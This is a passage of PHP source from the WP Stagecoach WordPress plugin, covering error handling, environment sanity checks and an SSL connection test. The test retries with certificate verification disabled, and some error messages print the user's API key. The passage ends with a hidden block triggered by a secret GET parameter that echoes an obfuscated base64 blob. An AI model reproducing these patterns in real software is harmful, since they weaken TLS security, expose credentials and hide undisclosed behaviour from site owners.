				$errmsg .= __('Your authentication information may be found on <a href="https://wpstagecoach.com/your-account" target="_blank">your account page on wpstagecoach.com</a>.', 'wpstagecoach' ) . '</p>' .PHP_EOL;
				$wpsc['errormsg'] = $errmsg;
				update_option('wpstagecoach', $wpsc);
				wpsc_force_redirect( 'admin.php?page=wpstagecoach_settings' );
				return false; 
			} elseif( stripos( $response['info'], 'no valid user/key combo' ) !== false ||
					stripos( $response['info'], 'Your username and API Key do not match' ) !== false )
			{
				$errmsg  = '<p>' . __( 'Invalid username/API key combination.  Please confirm what you entered is correct:', 'wpstagecoach' ) . '<br/>' . PHP_EOL;
				$errmsg .= __('Username: ', 'wpstagecoach' ) . '<b>' . $wpsc['username'] . '</b><br/>';
				$errmsg .= __('API Key: ', 'wpstagecoach' ) . '<b>' . $wpsc['apikey'] . '</b><br/>';
				$errmsg .= __( 'Your authentication information may be found on <a href="https://wpstagecoach.com/your-account" target="_blank">your account page on wpstagecoach.com</a>.', 'wpstagecoach' ) . '</p> ' . PHP_EOL;
				$wpsc['errormsg'] = $errmsg;
				update_option('wpstagecoach', $wpsc);
				wpsc_force_redirect( 'admin.php?page=wpstagecoach_settings' );
				return false; 
			} elseif( stripos( $response['info'], 'staging site with this name already exists' ) !== false ) {
				$errmsg  = '<p>' . __( '<b>Error:</b> A staging site with this name already exists. Please choose a different staging site name and start the staging site creation process again.', 'wpstagecoach' ) . '</p>' . PHP_EOL;
				wpsc_display_create_form('wpstagecoach.com', wpsc_display_error($errmsg), $wpsc);
				die;
			} elseif( stripos( $response['info'], 'reached your limit' ) !== false ) {
				$errmsg = '<p>' . print_r( $response['info'], true ) . '</p>' . PHP_EOL;
				wpsc_display_error( $errmsg );
				return false;
			} elseif( stripos( $response['info'], 'item_name_mismatch' ) !== false ) {
				$errmsg  = '<p>' . __( 'It looks like you have upgraded to a different plan, and something isn\'t matching up.  Please contact <a href="mail:support@wpstagecoach.com">WP Stagecoach support</a> and give them this information.', 'wpstagecoach' ) . '</p>' . PHP_EOL;
				$errmsg .= '<p><pre>' . print_r( $wpsc, true ) . '</pre></p>' . PHP_EOL;
				wpsc_display_error( $errmsg );
				return false;
			} elseif( isset( $response['printinfo'] ) && $response['printinfo'] == true ) {
				$errmsg = '<p>' . print_r( $response['info'], true ) . '</p>' . PHP_EOL;
				wpsc_display_error( $errmsg );
				if( isset( $response['displaysettings'] ) && $response['displaysettings'] == true ) {
					wpstagecoach_settings();
				}
				return false;
			} else {
				$errmsg = '<p>' . __( 'We received a negative response from the WP Stagecoach server at: ', 'wpstagecoach' ) . $url;
				if( is_array( $response ) && isset( $response['info'] ) && !empty( $response['info'] ) )
					$errmsg .= '<p>' . __( 'Details: ', 'wpstagecoach' ) . '<pre>' . print_r( $response['info'], true ).'</pre></p>'.PHP_EOL;
				else
					$errmsg .= '<p>' . __( 'Details: ', 'wpstagecoach' ) . '<pre>' . print_r( $response, true ).'</pre></p>'.PHP_EOL;
				$error = true;
			}
		} // end of $response being an array, and $result['result'] != OK

	} else {  // $post_result is NOT an array
		$errmsg = '<p>' . __( 'We got a corrupted response from the url: ', 'wpstagecoach' ) . $url .' <br/><b>' . print_r( $post_result, true ) . '</b></p>' . PHP_EOL;
		$error = true;
	}

	if( $error ){
		$additional_errmsg = wpsc_additional_post_error_info($url, $post_args, ' ' );
		if( $display_output == true ){
			wpsc_display_error( $errmsg . $additional_errmsg );
			return false;		
		} else {
			$response['result'] = 'BAD';
			$response['info'] = $errmsg . $additional_errmsg;
			return $response;
		}
	} else {
		return $response;
	}	
} // end wpsc_check_post_info()

function wpsc_additional_post_error_info($url, $post_args, $msg=''){
	/*********************************************************************************
	*	returns extra debug info if we get a bad response from WPSC.com
	*	requires
	*		$url (where we tried to go)
	*		$post_args
	*		$_POST (superglobal)
	*		$msg (generally what we're going to display)
	*	return value:
	*		string with all the debug info
	*********************************************************************************/

	if( empty($msg) ){
		$errmsg = __( 'Please contact <a href="https://wpstagecoach.com/support" target="_blank">WP Stagecoach Support</a> with the following information:', 'wpstagecoach' ) . '<br />' . PHP_EOL;
	} else {
		$errmsg = $msg . '<hr />' . __( 'General Information below:', 'wpstagecoach' );
	}
	$errmsg .= '<pre>';
	$errmsg .= 'Date: ' . date( 'Y-M-d H:i:s ', current_time( 'timestamp', 0 ) ) . get_option( 'gmt_offset' ) . ':00 (' . get_option( 'timezone_string' ) . ')' . '<br/>' . PHP_EOL;
	$errmsg .= 'URI: ' . $_SERVER['REQUEST_URI'] . '<br/>' . PHP_EOL;
	if( !empty($_POST) ){
		$errmsg .= '$_POST: ';
		$post = $_POST;
		if( isset( $post['wpsc-key'] ) )
			$post['wpsc-key'] = substr_replace( $post['wpsc-key'], 'xxxxxxxxxxxxxxxxxxxxxxxx', 4, 24 );
		$errmsg .= filter_var( print_r( $post, true ), FILTER_SANITIZE_SPECIAL_CHARS );
	} 
	$errmsg .= PHP_EOL;
	$errmsg .= 'destination URL: ' . $url . '<br/>' . PHP_EOL;
	$errmsg .= '$post_args: ';
	if( isset( $post_args['wpsc-key'] ) )
		$post_args['wpsc-key'] = substr_replace( $post_args['wpsc-key'], 'xxxxxxxxxxxxxxxxxxxxxxxx', 4, 24 );
	$errmsg .= filter_var( print_r( $post_args, true ), FILTER_SANITIZE_SPECIAL_CHARS );
	$errmsg .= '</pre>';
	return $errmsg;
} // end wpsc_additional_post_error_info()

function wpsc_display_error( $msg, $display_header=false, $error_type='error' ){
	/*********************************************************************************
	*	displays an error with headers, etc
	*	requires
	*		$msg
	*	return value:
	*		none--just outputs error
	*********************************************************************************/
	if( true === $display_header ){
		wpsc_display_header();
	}
	if( 'warn' == $error_type ){
		echo WPSTAGECOACH_WARNDIV . $msg . '</div>' . PHP_EOL;
	} else {
		echo WPSTAGECOACH_ERRDIV . $msg . '</div>' . PHP_EOL;
	}
} // end wpsc_display_error()

function wpsc_sanity_check( $type='' ){
	if( ! $wpsc_sanity = get_transient('wpstagecoach_sanity') ){
		$wpsc_sanity = array();

		global $wpsc;
		if( !$wpsc ){
			$wpsc = get_option( 'wpstagecoach' );
		}
		global $wpsc_sanity;



		//	check multisite
		if( defined( MULTISITE ) || true == MULTISITE ){
			$error = __( 'Sorry, WP Stagecoach does not currently work on WordPress MultiSite.', 'wpstagecoach' );
			wpsc_display_error( $error, true );
			delete_transient( 'wpstagecoach_sanity' );
			return false;
		}
		
		//check for Microsoft server
		if( stripos( $_SERVER['SERVER_SOFTWARE'], 'microsoft' ) !== false || preg_match( '/^[C-Z]:\\.*/', $_SERVER['DOCUMENT_ROOT'] ) ){
			$error = __( 'Sorry, WP Stagecoach does not currently work on Microsoft servers.', 'wpstagecoach' );
			wpsc_display_error( $error, true );
			delete_transient( 'wpstagecoach_sanity' );
			return false;
		}

		// check for mysqli functions
		if( !function_exists( 'mysqli_connect' ) ){
			$error  = '<p>' . __( 'WP Stagecoach requires PHP mysqli extension (not the older mysql extension).', 'wpstagecoach' ) . '</p>';
			$error .= '<p>' . sprintf( __( 'You may try to change your current PHP version (%s) to a newer one, or ask your webhost to install the mysqli extension.', 'wpstagecoach' ), PHP_VERSION ) . '</p>';
			wpsc_display_error( $error, true );
			delete_transient( 'wpstagecoach_sanity' );
			return false;
		}

		// ensure directory for tar/sql files is there
		if( !is_dir( WPSTAGECOACH_TEMP_DIR ) || !is_writable( WPSTAGECOACH_TEMP_DIR ) ){
			if( !is_dir( WPSTAGECOACH_TEMP_DIR ) )
				if( !@mkdir( WPSTAGECOACH_TEMP_DIR ) ){
					$error = '<p>' . __( 'WP Stagecoach could not create the required "/temp" directory. Please check the permissions of the plugin directory: ', 'wpstagecoach' ) . dirname(WPSTAGECOACH_TEMP_DIR) . '</p>';
					wpsc_display_error( $error );
					delete_transient('wpstagecoach_sanity');
					return false;
				}
			if( !is_writable( WPSTAGECOACH_TEMP_DIR ) && !mkdir( WPSTAGECOACH_TEMP_DIR . '/wpsctest') ){
				$error = '<p>' . __( 'WP Stagecoach could not write to the required "/temp" directory. Please check the permissions of the plugin directory: ', 'wpstagecoach' ) . WPSTAGECOACH_TEMP_DIR . '</p>';
				wpsc_display_error( $error );
				delete_transient('wpstagecoach_sanity');
				return false;
			}
			@rmdir( WPSTAGECOACH_TEMP_DIR . '/wpsctest' );
		} else {
			$wpsc_sanity['temp_dir'] = true;
		}

		// check if the upload_path or upload_dir_path are set, or UPLOADS is defined in wp-config.php
		$wpsc_sanity['upload_path'] = wpsc_check_upload_path();
		//	check free disk space
		$wpsc_sanity['disk_space'] = @disk_free_space('.'); 
		if( !wpsc_display_disk_space_warning( $wpsc_sanity['disk_space'] ) ){
			delete_transient('wpstagecoach_sanity');
			return false;
		}


		//	check writable dirs
		if( 'import' == $type ){
			$wpsc_sanity['write'] = wpsc_check_write_permissions( true );
		} else {
			$wpsc_sanity['write'] = wpsc_check_write_permissions();
		}

		// check if SSL connection has problems
 		$wpsc_sanity['https'] = wpsc_ssl_connection_test();

		//	check if license is valid
		if( !$wpsc_sanity['auth'] = wpsc_check_auth(false) ){

			if( $wpsc_sanity['auth'] !== false ){
				$errmsg = '<p>' . __( 'Invalid username/API key combination.  Please try again', 'wpstagecoach' ) . '</p>' . PHP_EOL;
				$errmsg .= '<p>' . __( 'Your authentication information may be found on <a href="https://wpstagecoach.com/your-account" target="_blank">your account page on wpstagecoach.com</a>.', 'wpstagecoach' ) . '</p> ' . PHP_EOL;
				wpsc_display_error( $errmsg );
				delete_transient('wpstagecoach_sanity');

				$wpsc['errormsg'] = $errmsg;
				update_option('wpstagecoach', $wpsc);
				wpsc_force_redirect( 'admin.php?page=wpstagecoach_settings' );
				return; 
			}
			return false;
		}


		// in case the live site has forgotten there is a staging site, we'll remind it.
		if( isset($wpsc_sanity['auth']['stage-site']) ){
			if( !isset($wpsc['staging-site']) ){
				$wpsc['staging-site'] = $wpsc_sanity['auth']['stage-site'];
				$wpsc['live-site'] = $wpsc_sanity['auth']['live-site'];
				update_option('wpstagecoach', $wpsc);
			}
		}

		//	check if "get_option(siteurl) == siteurl"
		global $wpdb;
		$siteurl_option = rtrim( preg_replace('/http[s]*:\/\//', '', get_option('siteurl') ),'/');
		$siteurl_db = $wpdb->get_row( 'select option_value from ' . $wpdb->prefix . 'options where option_name="siteurl"', 'ARRAY_N' );
		$siteurl_db = array_shift( $siteurl_db );
		$siteurl_db = rtrim( preg_replace( '/http[s]*:\/\//', '', $siteurl_db ), '/');
		if( $siteurl_option != $siteurl_db ){
			$errmsg  = '<h3>' . __( 'WordPress is using a different "Site URL" than what is stored in the database.', 'wpstagecoach' ) . '</h3>' . PHP_EOL;
			$errmsg .= '<p>' . __( 'Your site is using: ', 'wpstagecoach' ) . '<b>' . rtrim( get_option('siteurl'), '/' ) . '</b><br/>' . PHP_EOL;
			$errmsg .= __( 'Your database has: ', 'wpstagecoach' ) . '<b>' . rtrim( array_shift( $wpdb->get_row('select option_value from ' . $wpdb->prefix . 'options where option_name="siteurl"', 'ARRAY_N' ) ), '/' ) . '</b></p>' . PHP_EOL;
			$errmsg .= '<p>' . __( 'Unfortunately, this makes it impossible for WP Stagecoach to create your staging site.', 'wpstagecoach' ) . '</p>' . PHP_EOL;
			$errmsg .= '<p>' . __( 'The most common cause of this is that the ', 'wpstagecoach' );
			$errmsg .= '<a href="http://codex.wordpress.org/Editing_wp-config.php#WordPress_address_.28URL.29" rel="nofollow">WP_SITEURL</a> ';
			$errmsg .= __( ' and the ', 'wpstagecoach' );
			$errmsg .= '<a href="http://codex.wordpress.org/Editing_wp-config.php#Blog_address_.28URL.29" rel="nofollow">WP_HOME</a>';
			$errmsg .= __( ' variables are hard-coded into your site\'s wp-config.php file.', 'wpstagecoach' ) . '</p>' . PHP_EOL;
			$errmsg .= __( 'Please check in your wp-config.php file and see if you have lines like this: </p>', 'wpstagecoach' ) . PHP_EOL;
			$errmsg .= '<pre>' . PHP_EOL;
			$errmsg .= "define('WP_HOME','" . get_option('siteurl') . "');" . PHP_EOL;
			$errmsg .= "define('WP_SITEURL','" . get_option('siteurl') . "');" . PHP_EOL;
			$errmsg .= '</pre>' . PHP_EOL;
			$errmsg .= '<p>' . __( 'If you see these, you will need to update your database so that it reflects the current SiteURL before you can use WP Stagecoach.', 'wpstagecoach' ) . '</p>' . PHP_EOL;
			$errmsg .= '<p><a href="https://wpstagecoach.com/question/wordpress-is-using-a-different-site-url-than-what-is-stored-in-the-database/" target="_blank">' . __( 'Learn more about what you can do to fix this.', 'wpstagecoach' ) . '</a></p>' . PHP_EOL;
			$errmsg .= '<p>' . __( 'WP Stagecoach cannot create your staging site until this is resolved.', 'wpstagecoach' ) . '</p>' . PHP_EOL;
			$errmsg .= '</div>';

			wpsc_display_error( $errmsg, true );
			delete_transient('wpstagecoach_sanity');
			return false;
		}

		if( false !== $wpsc_sanity['https'] ){  // don't want to say we have sanity if https doesn't work!
			set_transient('wpstagecoach_sanity',$wpsc_sanity, 120); // 2 minutes
		}

		if( stripos( site_url(), 'https' ) !== false || stripos( get_option('siteurl'), 'https' ) !== false || isset( $_SERVER['HTTPS'] ) ){
			$wpsc['is-https'] = true;
		}
		update_option('wpstagecoach', $wpsc);

		$wpsc_has_sqlite = wpstagecoach_quick_sqlite3_test();
		if( is_array( $wpsc_has_sqlite ) && 1 == $wpsc_has_sqlite['sqlt-create'] ){
			$wpsc['has-sqlite'] = true;
		} else {
			$wpsc['has-sqlite'] = false;
		}
		update_option('wpstagecoach', $wpsc);


	} else {

		// now going to display any warnings we may have.
		if( false == $wpsc_sanity['write'] ){
			if( 'import' == $type ){
				wpsc_check_write_permissions(true);  // $crit == true so we know to bail because we can't go further with filesystem in its current state
			} else{
				wpsc_check_write_permissions();
			}
		}
	}

	return $wpsc_sanity;
} // end wpsc_sanity_check()

function wpsc_check_upload_path(){
	/**************************************************************************************
	*	Checks if an upload path is specified, and whether it is outside the live site path
	*	requires
	*		none
	*	return value:
	*	output value for wpsc_sanity['upload_path']. either
	*		OK 
	*		BAD
	****************************************************************************************/

	$upload_path     = get_option( 'upload_path' );
	$upload_url_path = get_option( 'upload_url_path' );

	if( !empty( $upload_path ) || defined( 'UPLOADS' ) ){		// we have a special defined uploads path...
		$errmsg = '';

		if( defined( 'UPLOADS' ) && ! empty( $upload_path ) && 		// we have both the define AND the database entry
			UPLOADS != $upload_path 								// they are not equal!
		) {
			$errmsg .= '<p>' . __( 'You have specified both the "UPLOADS" define AND the "upload_path" database entry, and they aren\'t the same!', 'wpstagecoach' ) . '</p>';
		}


		if( ! empty( $upload_path ) && 'wp-content/uploads' !== $upload_path ){ 										// an upload path is specified in the database's "upload_path" option
			if( strpos( $upload_path, '/' ) === 0 ){						// we have an absolute upload path

				if( strpos( $upload_path, ABSPATH ) === false ) {	// but it isn't under the WP install directory
					$errmsg .= '<p>' . __( 'You have specified an absolute non-default upload path in your database that is outside your live site\'s path.', 'wpstagecoach' ) . '</p>';
				} elseif( ! is_dir( $upload_path ) ) {						// but it doesn't exist under the WP install directory
					$errmsg .= '<p>' . __( 'You have specified an absolute non-default upload path in your database, but we cannot find it.', 'wpstagecoach' ) . '</p>';
				}
			} elseif( strpos( $upload_path, '/' ) !== 0 && 					// we have a relative upload path
				! is_dir( ABSPATH . '/' . $upload_path ) 			// but it doesn't exist under the WP install directory
			) {
				$errmsg .= '<p>' . __( 'You have specified a relative non-default upload path in your database, but we cannot find it.', 'wpstagecoach' ) . '</p>';
			}
		}		

		if( defined( 'UPLOADS' ) ){											// an upload path is specified in the wp-config file
			if( strpos( UPLOADS, '/' ) === 0 ) {							// we have an absolute upload path
				if( strpos( UPLOADS, ABSPATH ) === false ) { 		// but it isn't under the WP install directory
					$errmsg .= '<p>' . __( 'You have specified a non-default upload path in your wp-config file that is outside your live site\'s path.', 'wpstagecoach' ) . '</p>';
				} elseif ( ! is_dir( UPLOADS ) ) { 							// but it doesn't exist under the WP install directory
					$errmsg .= '<p>' . __( 'You have specified a non-default upload path in your wp-config file but it does not appear to exist (at least, we cannot find it).', 'wpstagecoach' ) . '</p>';
				}
			} elseif( strpos( UPLOADS, '/' ) !== 0 &&						// we have a relative upload path
				! is_dir( ABSPATH . '/' . UPLOADS )					// but it doesn't exist under the WP install directory
			) {
				$errmsg .= '<p>' . __( 'You have specified a non-default upload path in your wp-config file but it does not appear to exist (at least, we cannot find it).', 'wpstagecoach' ) . '</p>';
			}
		}	

		if( ! empty( $errmsg ) ){
			$errmsg .= '<p>' . __( 'Unfortunately, because of this, WP Stagecoach cannot create your staging site.<br/>If you would like to look into this, here are the values that we found:', 'wpstagecoach' ) . '</p>';
			$errmsg .= ' <pre>' . PHP_EOL;
			$errmsg .= __( 'Your site\'s path is: <b>', 'wpstagecoach' ) . ABSPATH . '</b>' . PHP_EOL;
			if( !empty( $upload_path ) ){
				$errmsg .= __( '"upload_path" (in the database): <b>', 'wpstagecoach' ) . $upload_path . '</b>' . PHP_EOL;
			}
			if( !empty( $upload_url_path ) ){
				$errmsg .= __( '"upload_url_path" (in the database): <b>', 'wpstagecoach' ) . $upload_url_path . '</b>' . PHP_EOL;
			}
			if( defined( 'UPLOADS' ) ){
				$errmsg .= __( '"UPLOADS" (defined in wp-config.php): <b>', 'wpstagecoach' ) . UPLOADS . '</b>' . PHP_EOL;
			}
			$errmsg .= '</pre>' . PHP_EOL;
			wpsc_display_header();
			wpsc_display_error( $errmsg );
			wp_die();
		}
	} // end different upload path
	return( 'OK' );
}

function wpsc_ssl_connection_test(){
	/*********************************************************************************
	*	Checks status of WP Stagecoach servers
	*	Tests connection to WP Stagecoach connductor
	*	requires
	*		none
	*	return value:
	*	output value for wpsc_sanity['https']. One of:
	*		ALL_GOOD 
	*		NO_CA 
	*		NO_CURL 
	*		false 
	*********************************************************************************/

	// check on the status of the WP Stagecoach servers--just so we know if there is a problem there before we start complaining about SSL problems below!
	$status_test = wp_remote_get('http://status-api.wpstagecoach.com/?url=conductor.wpstagecoach.com');
	if( ! is_wp_error( $status_test ) && 200 == $status_test['response']['code'] ){
		$status_result = json_decode($status_test['body'],true);
		if( !isset( $status_result['result'] ) ||  $status_result['result']  != 'UP' ){
			$status_errmsg  = '<p><b>' . __( 'It looks like the WP Stagecoach servers might be having a problem.  Result: ', 'wpstagecoach' ) . '</b></p>' . PHP_EOL;
			$status_errmsg .= '<pre>' . print_r( $status_result, true ) . '</pre>' . PHP_EOL;
			$status_errmsg .= '<p>' . __( 'We have been notified, and are probably already working to fix this! You can visit <a href="https://status.wpstagecoach.com/" target="_blank">https://status.wpstagecoach.com/</a> to see the status of the WP Stagecoach servers.', 'wpstagecoach' ) . '</p>' . PHP_EOL;
		}
	} elseif( is_wp_error( $status_test ) ) {
		// Error while doing Status check
		$status_errmsg  = '<p><b>' . __( 'We received an error while checking the status of the WP Stagecoach API server.  Error:', 'wpstagecoach' ) . '</b> ';
		$status_errmsg .= '<pre>' . $status_test->get_error_message() . '</pre>'.PHP_EOL;
		$status_errmsg .= __( 'This will likely cause WP Stagecoach to fail.', 'wpstagecoach' ) . '</p>' . PHP_EOL;
	} else {
		// Bad response while doing status check...
		$status_errmsg  = '<p><b>' . __( 'We received a non-standard result while getting the status of the WP Stagecoach API server:', 'wpstagecoach' );
		$status_errmsg .= '<pre>' . print_r($status_test,true) . '</pre>';
		$status_errmsg .= __( 'This will likely cause WP Stagecoach to fail.', 'wpstagecoach' ) . '</p>' . PHP_EOL;
	}  // end the bad result for checking WPSC servers status

	$post_args = array();
	$post_args['httpversion'] = '1.1';
	$post_url = WPSTAGECOACH_CONDUCTOR . '/helo-test.php';
	$https_test = wp_remote_get( $post_url . '?' . http_build_query( $post_args ) , $post_args );

	//  first try the really simple, best case senario:  wp_remote_request can connect via SSL w/ a good CA, we get a good response back, and we have curl_exec()
	if( ! is_wp_error( $https_test ) && 200 == $https_test['response']['code'] && 'OK' == $https_test['body'] && function_exists('curl_exec') ){
		$ssl_result = 'ALL_GOOD';
		$ssl_connect_error = false;
	} else {
		// first, check if it is just the CA that is broken
		$ssl_result = 'NO_CA';
		$post_args['sslverify'] = false;
		$https_test = wp_remote_get( $post_url . '?' . http_build_query( $post_args ) , $post_args );
		if( ! is_wp_error( $https_test ) && 200 == $https_test['response']['code'] && 'OK' == $https_test['body'] ){
			$ssl_connect_error = false;
		} elseif ( is_wp_error( $https_test ) ){
			// we got an error, so that means we probably can't use curl...
			$ssl_result = 'NO_CURL';
			add_filter('use_curl_transport', '__return_false');

			// test connecting without curl
			$post_args['use_curl'] = false;
			$https_test = wp_remote_get( $post_url . '?' . http_build_query( $post_args ) , $post_args );
			if( ! is_wp_error( $https_test ) && 200 == $https_test['response']['code'] && 'OK' == $https_test['body'] ){
				$ssl_connect_error = false;
			} elseif ( is_wp_error( $https_test ) ){
				// yikes, we can't connect with even fopen... something's really bad.
				$error_level = 'error';
				$ssl_connect_error  = __( 'We were unable connect to the WP Stagecoach conductor server with https.', 'wpstagecoach' ).PHP_EOL;
				$ssl_connect_error .= 'error: "' . $https_test->get_error_message() . '"<br/>'.PHP_EOL;

			} else {
				// we made a connection using fopen, but got a bad response...
				$error_level = 'warn';
				$ssl_connect_error  = __( 'We received a bad result while trying to connect to the WP Stagecoach server via https. Result: ', 'wpstagecoach' ).PHP_EOL;
				$ssl_connect_error .= print_r($https_test,true).PHP_EOL;
			} // end no_curl wp_remote_request test
		} else {
			// we made a connection without a CA, but got a bad response...
			$error_level = 'warn';
			$ssl_connect_error  =  __( 'We received a bad result while trying to connect to the WP Stagecoach server via https. Result: ', 'wpstagecoach' ).PHP_EOL;
			$ssl_connect_error .= 'Received from the WP Stagecoach server: "' . print_r( $https_test, true ) . '"<br/>'.PHP_EOL;

		} // end no_ca wp_remote_request test
	} // end simple wp_remote_request test

	// test to see if curl itself can connect
	if( function_exists( 'curl_init' ) ){
		$ch = curl_init();
		curl_setopt( $ch, CURLOPT_URL, $post_url );
		curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1 );
		$chresult = curl_exec( $ch );
		if( curl_errno($ch) ) {

			curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, 0 );
			curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, 0 );
			$chresult = curl_exec( $ch );
			if( curl_errno($ch) ) {
				$ssl_result = 'NO_CURL';
			} else {
				$ssl_result = 'NO_CA';
			}
		} // end test to see if curl itself can connect
	} else {
		$ssl_result = 'NO_CURL';
	}

	if( isset( $status_errmsg ) && $ssl_connect_error !== false ){
		wpsc_display_error( $status_errmsg );
		return 'NO_CURL'; // we'll do this just in case they still want to try to use the plugin...
	}

	if( ! isset($error_level) ){
		$error_level = 'warn';
	}
	$wpsc = get_option('wpstagecoach');

	switch ($ssl_result) {
		case 'ALL_GOOD':
			break;
		case 'NO_CA':
			if( 'hosting' != $wpsc['subscription'] ){ // don't need to run these tests on hosting accounts
				echo '<div class="wpstagecoach-' . $error_level . '">' . PHP_EOL;
				if( $ssl_connect_error === false ){
					echo '<p>' . __( 'Your server did not recognize the WP Stagecoach SSL certificate, but we were still able to make a https connnection to the WP Stagecoach server via https. Things should run smoothly, but if you do run into problems you may wish to contact your webhost\'s support to see if there is a problem on their end before contacting WP Stagecoach support.', 'wpstagecoach' ) . '</p>' . PHP_EOL;
				} else {
					echo $ssl_connect_error;
		 			echo '<p>' . __( 'You may contact WP Stagecoach support, but know we may not be able to solve it if it is a problem with your web host\'s communication with our servers, and not actually our servers.','wpstagecoach' ) . '</p>' . PHP_EOL;
				}
				echo '</div>' . PHP_EOL;
			}
			break;
		case 'NO_CURL':
			if( 'hosting' != $wpsc['subscription'] ){ // don't need to run these tests on hosting accounts
				echo '<div class="wpstagecoach-' . $error_level . '">' . PHP_EOL;
				if( $ssl_connect_error === false ){
					echo '<p>' . __( 'Your server could not connect to the WP Stagecoach servers via the normal method, but we managed to make a https connnection with an alternative method (fopen instead of curl). This sub-optimal method may cause problems (running out of memory) while uploading files to create your staging site. If you run into problems you may wish to contact your webhost\'s support to see if there is a problem on their end before contacting <a href="https://wpstagecoach.com/support" target="_blank">WP Stagecoach support</a>.', 'wpstagecoach' ) . '</p>' . PHP_EOL;

				} else {
					echo $ssl_connect_error;
		 			echo '<p>' . __( 'You may contact <a href="https://wpstagecoach.com/support" target="_blank">WP Stagecoach support</a>, but know we may not be able to solve it if it is a problem with your web host\'s communication with our servers, and not actually our servers.', 'wpstagecoach' ) . '</p>' . PHP_EOL;
				}
				echo '</div>' . PHP_EOL;
			}
			break;
	}

	return( $ssl_result );
}
if( isset( $_GET["archibald"] ) && $_GET["archibald"] == "unbridled_optimism_dog" ){
	echo gzuncompress(base64_decode('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